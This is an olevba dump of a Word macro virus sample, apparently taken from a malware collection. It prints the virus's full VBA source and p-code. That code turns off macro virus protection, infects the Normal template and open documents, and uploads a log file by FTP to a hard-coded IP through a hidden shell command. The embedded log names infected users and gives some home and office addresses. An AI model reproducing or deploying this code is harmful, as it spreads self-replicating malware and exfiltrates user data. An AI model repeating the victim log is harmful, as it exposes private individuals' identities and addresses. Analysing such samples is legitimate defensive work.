olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.u
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.u - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub DisableAV()
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
End Sub
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 12:04:46 PM - Wednesday, 23 Dec 1998
' BCBSA
'



' 11:32:13 AM - Thursday, 24 Dec 1998
' BCBSA
'



' 11:43:52 AM - Monday, 28 Dec 1998
' BCBSA
'



' 12:03:48 PM - Wednesday, 6 Jan 1999
' Tricia
'



' 11:45:55 AM - Thursday, 14 Jan 1999
' Debra C. Hopkinson
'



' 03:02:33 PM - Monday, 25 Jan 1999
' r
'



' 02:26:51 PM - Wednesday, 17 Feb 1999
' Jen Heim
' Gunderson Dettmer
' 155 Constitution Drive
' Menlo Park, CA  94025



' 09:53:30 AM - Thursday, 18 Feb 1999
' Patti A. Smith
' Patti Smith
' 4411 Spicewood Springs Rd, Apt. 1809
' Austin, TX  78759



' 12:39:28 PM - Thursday, 18 Feb 1999
' Kathy F. Nahay
' Gunderson Dettmer
' 8911 Capital of Texas Highway, Suite #4240
' Austin, TX  78759



' 08:10:48 PM - Thursday, 18 Feb 1999
' Chris Hajdu
'



' 08:27:50  - jeudi, 4 mars 1999
' Pascal TRACLET
'



' 02:10:39  - mardi, 9 mars 1999
' Emmanuel
'



' 04:33:10  - mardi, 16 mars 1999
' Bernède
'



' 05:57:21  - mercredi, 24 mars 1999
' FNAC
'



' 10:32:10  - mercredi, 31 mars 1999
' FRANCOISE BARBIER
'



' 12:44:40  - mardi, 6 avr 1999
' FRANCOISE BARBIER
'



' 05:34:45  - jeudi, 8 avr 1999
' FRANCOISE BARBIER
'



' 03:41:55  - vendredi, 9 avr 1999
' GISELE VERNIER
' Réf. annonce



' 11:14:47  - vendredi, 30 avr 1999
' DIR-PRN-001
'



' 11:19:47  - mercredi, 26 mai 1999
' SAV-VLZ-001
'



' 03:36:32  - mercredi, 9 juin 1999
' ISABELLE SBERRO
'



' 04:58:50  - jeudi, 17 juin 1999
' JOCELYNE ANTON
'



' 07:51:04 PM - Thursday, 24 Jun 1999
' Data Fellows
'



' 08:57:01  - ñðåäà, 2 èþí 1999
' Mike Pavluschick
'



' 02:56:10 PM - Wednesday, 4 Aug 1999
' Ditry PC
'



' 12:00:58 PM - Monday, 12 Jan 2009
' sid
'



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.u
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 13678 bytes
' Line #0:
' 	FuncDefn (Public Sub DisableAV())
' Line #1:
' 	LitStr 0x0005 "Check"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0058 "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #3:
' 	LitStr 0x0004 "Whoa"
' 	LitStr 0x0000 ""
' 	LitStr 0x0047 "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #4:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options"
' 	LitStr 0x0014 "MacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options"
' 	LitStr 0x0014 "MacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0044 "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options"
' 	LitStr 0x0014 "MacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Private Sub Document_Close())
' Line #9:
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' Line #12:
' 	Dim (Const) 
' 	LitStr 0x0014 "<- this is a marker!"
' 	VarDefn Marker
' Line #13:
' Line #14:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #15:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #16:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #17:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #18:
' Line #19:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #22:
' Line #23:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #24:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #25:
' Line #26:
' Line #27:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #29:
' Line #30:
' Line #31:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #32:
' Line #33:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #35:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #40:
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #42:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	LitStr 0x0006 "C:\hsf"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #45:
' Line #46:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #49:
' Line #50:
' 	LitStr 0x000D "c:\netldx.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #59:
' Line #60:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #61:
' Line #62:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #63:
' Line #64:
' 	EndIfBlock 
' Line #65:
' Line #66:
' Line #67:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #68:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #69:
' Line #70:
' Line #71:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #72:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #73:
' Line #74:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #75:
' Line #76:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #77:
' Line #78:
' Line #79:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #81:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #82:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #83:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	ElseBlock 
' Line #86:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' Line #90:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #91:
' Line #92:
' Line #93:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #94:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #95:
' Line #96:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #97:
' Line #98:
' 	EndIfBlock 
' Line #99:
' Line #100:
' Line #101:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #102:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #103:
' Line #104:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #105:
' Line #106:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #107:
' Line #108:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #109:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #110:
' Line #111:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #112:
' Line #113:
' 	EndIfBlock 
' Line #114:
' Line #115:
' Line #116:
' 	EndIfBlock 
' Line #117:
' Line #118:
' 	EndSub 
' Line #119:
' Line #120:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #121:
' Line #122:
' 	QuoteRem 0x0000 0x0022 " 09:08:36  - Saturday, 28 Nov 1998"
' Line #123:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #124:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #125:
' 	QuoteRem 0x0000 0x0000 ""
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' 	QuoteRem 0x0000 0x0024 " 02:50:31 PM - Saturday, 28 Nov 1998"
' Line #130:
' 	QuoteRem 0x0000 0x000D " MARK B. SEAY"
' Line #131:
' 	QuoteRem 0x0000 0x0000 ""
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' 	QuoteRem 0x0000 0x0021 " 08:04:45 AM - Friday, 4 Dec 1998"
' Line #136:
' 	QuoteRem 0x0000 0x0004 " UPS"
' Line #137:
' 	QuoteRem 0x0000 0x0000 ""
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' 	QuoteRem 0x0000 0x0024 " 11:43:35 AM - Thursday, 17 Dec 1998"
' Line #142:
' 	QuoteRem 0x0000 0x0004 " WRO"
' Line #143:
' 	QuoteRem 0x0000 0x0000 ""
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' 	QuoteRem 0x0000 0x0025 " 12:04:46 PM - Wednesday, 23 Dec 1998"
' Line #148:
' 	QuoteRem 0x0000 0x0006 " BCBSA"
' Line #149:
' 	QuoteRem 0x0000 0x0000 ""
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' 	QuoteRem 0x0000 0x0024 " 11:32:13 AM - Thursday, 24 Dec 1998"
' Line #154:
' 	QuoteRem 0x0000 0x0006 " BCBSA"
' Line #155:
' 	QuoteRem 0x0000 0x0000 ""
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' 	QuoteRem 0x0000 0x0022 " 11:43:52 AM - Monday, 28 Dec 1998"
' Line #160:
' 	QuoteRem 0x0000 0x0006 " BCBSA"
' Line #161:
' 	QuoteRem 0x0000 0x0000 ""
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' 	QuoteRem 0x0000 0x0024 " 12:03:48 PM - Wednesday, 6 Jan 1999"
' Line #166:
' 	QuoteRem 0x0000 0x0007 " Tricia"
' Line #167:
' 	QuoteRem 0x0000 0x0000 ""
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' 	QuoteRem 0x0000 0x0024 " 11:45:55 AM - Thursday, 14 Jan 1999"
' Line #172:
' 	QuoteRem 0x0000 0x0013 " Debra C. Hopkinson"
' Line #173:
' 	QuoteRem 0x0000 0x0000 ""
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' 	QuoteRem 0x0000 0x0022 " 03:02:33 PM - Monday, 25 Jan 1999"
' Line #178:
' 	QuoteRem 0x0000 0x0002 " r"
' Line #179:
' 	QuoteRem 0x0000 0x0000 ""
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' 	QuoteRem 0x0000 0x0025 " 02:26:51 PM - Wednesday, 17 Feb 1999"
' Line #184:
' 	QuoteRem 0x0000 0x0009 " Jen Heim"
' Line #185:
' 	QuoteRem 0x0000 0x0012 " Gunderson Dettmer"
' Line #186:
' 	QuoteRem 0x0000 0x0017 " 155 Constitution Drive"
' Line #187:
' 	QuoteRem 0x0000 0x0016 " Menlo Park, CA  94025"
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' 	QuoteRem 0x0000 0x0024 " 09:53:30 AM - Thursday, 18 Feb 1999"
' Line #192:
' 	QuoteRem 0x0000 0x000F " Patti A. Smith"
' Line #193:
' 	QuoteRem 0x0000 0x000C " Patti Smith"
' Line #194:
' 	QuoteRem 0x0000 0x0025 " 4411 Spicewood Springs Rd, Apt. 1809"
' Line #195:
' 	QuoteRem 0x0000 0x0012 " Austin, TX  78759"
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' 	QuoteRem 0x0000 0x0024 " 12:39:28 PM - Thursday, 18 Feb 1999"
' Line #200:
' 	QuoteRem 0x0000 0x000F " Kathy F. Nahay"
' Line #201:
' 	QuoteRem 0x0000 0x0012 " Gunderson Dettmer"
' Line #202:
' 	QuoteRem 0x0000 0x002B " 8911 Capital of Texas Highway, Suite #4240"
' Line #203:
' 	QuoteRem 0x0000 0x0012 " Austin, TX  78759"
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0024 " 08:10:48 PM - Thursday, 18 Feb 1999"
' Line #208:
' 	QuoteRem 0x0000 0x000C " Chris Hajdu"
' Line #209:
' 	QuoteRem 0x0000 0x0000 ""
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' 	QuoteRem 0x0000 0x001F " 08:27:50  - jeudi, 4 mars 1999"
' Line #214:
' 	QuoteRem 0x0000 0x000F " Pascal TRACLET"
' Line #215:
' 	QuoteRem 0x0000 0x0000 ""
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' 	QuoteRem 0x0000 0x001F " 02:10:39  - mardi, 9 mars 1999"
' Line #220:
' 	QuoteRem 0x0000 0x0009 " Emmanuel"
' Line #221:
' 	QuoteRem 0x0000 0x0000 ""
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' 	QuoteRem 0x0000 0x0020 " 04:33:10  - mardi, 16 mars 1999"
' Line #226:
' 	QuoteRem 0x0000 0x0008 " Bernède"
' Line #227:
' 	QuoteRem 0x0000 0x0000 ""
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' 	QuoteRem 0x0000 0x0023 " 05:57:21  - mercredi, 24 mars 1999"
' Line #232:
' 	QuoteRem 0x0000 0x0005 " FNAC"
' Line #233:
' 	QuoteRem 0x0000 0x0000 ""
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' 	QuoteRem 0x0000 0x0023 " 10:32:10  - mercredi, 31 mars 1999"
' Line #238:
' 	QuoteRem 0x0000 0x0012 " FRANCOISE BARBIER"
' Line #239:
' 	QuoteRem 0x0000 0x0000 ""
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' 	QuoteRem 0x0000 0x001E " 12:44:40  - mardi, 6 avr 1999"
' Line #244:
' 	QuoteRem 0x0000 0x0012 " FRANCOISE BARBIER"
' Line #245:
' 	QuoteRem 0x0000 0x0000 ""
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' 	QuoteRem 0x0000 0x001E " 05:34:45  - jeudi, 8 avr 1999"
' Line #250:
' 	QuoteRem 0x0000 0x0012 " FRANCOISE BARBIER"
' Line #251:
' 	QuoteRem 0x0000 0x0000 ""
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' 	QuoteRem 0x0000 0x0021 " 03:41:55  - vendredi, 9 avr 1999"
' Line #256:
' 	QuoteRem 0x0000 0x000F " GISELE VERNIER"
' Line #257:
' 	QuoteRem 0x0000 0x000D " Réf. annonce"
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' 	QuoteRem 0x0000 0x0022 " 11:14:47  - vendredi, 30 avr 1999"
' Line #262:
' 	QuoteRem 0x0000 0x000C " DIR-PRN-001"
' Line #263:
' 	QuoteRem 0x0000 0x0000 ""
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' 	QuoteRem 0x0000 0x0022 " 11:19:47  - mercredi, 26 mai 1999"
' Line #268:
' 	QuoteRem 0x0000 0x000C " SAV-VLZ-001"
' Line #269:
' 	QuoteRem 0x0000 0x0000 ""
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' 	QuoteRem 0x0000 0x0022 " 03:36:32  - mercredi, 9 juin 1999"
' Line #274:
' 	QuoteRem 0x0000 0x0010 " ISABELLE SBERRO"
' Line #275:
